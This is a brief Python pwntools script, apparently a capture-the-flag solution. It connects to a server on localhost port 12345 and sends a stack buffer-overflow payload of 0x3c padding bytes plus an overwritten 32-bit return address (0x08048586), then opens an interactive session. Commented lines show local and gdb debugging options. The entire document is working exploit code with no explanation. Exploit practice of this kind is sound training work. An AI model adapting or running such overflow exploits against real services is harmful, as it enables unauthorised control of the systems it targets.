from pwn import *

# target = process("./server")

target = remote("localhost", "12345")
# gdb.attach(target, gdbscript = 'b *0x08048628')

payload = b"S" * 0x3c + p32(0x08048586)

target.sendline(payload)

target.interactive()